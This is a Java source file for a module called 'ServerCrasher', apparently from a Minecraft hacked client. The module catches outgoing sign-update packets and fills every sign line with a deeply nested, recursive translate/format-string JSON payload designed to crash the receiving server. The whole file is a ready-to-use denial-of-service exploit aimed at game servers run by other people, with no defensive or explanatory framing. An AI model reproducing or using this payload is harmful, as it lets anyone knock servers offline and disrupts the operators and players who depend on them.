package axis.shiyan.wei.bluearchive.blinkfix.modules.impl.misc;

import axis.shiyan.wei.bluearchive.blinkfix.events.api.EventTarget;
import axis.shiyan.wei.bluearchive.blinkfix.events.api.types.EventType;
import axis.shiyan.wei.bluearchive.blinkfix.events.impl.EventPacket;
import axis.shiyan.wei.bluearchive.blinkfix.modules.Category;
import axis.shiyan.wei.bluearchive.blinkfix.modules.Module;
import axis.shiyan.wei.bluearchive.blinkfix.modules.ModuleInfo;
import net.minecraft.network.play.client.C12PacketUpdateSign;

@ModuleInfo(name = "ServerCrasher", description = "Crashes the server", category = Category.MISC)
public class ServerCrasher extends Module {
    private static final String payload = "{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"a\", \"a\"]}]}]}]}]}]}]}]}";

    @EventTarget
    public void onPacket(EventPacket e) {
        if (e.getType() == EventType.SEND && e.getPacket() instanceof C12PacketUpdateSign) {
            C12PacketUpdateSign packet = (C12PacketUpdateSign) e.getPacket();
            packet.getLines()[0] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[1] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[2] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[3] = new net.minecraft.util.ChatComponentText(payload);
        }
    }
}
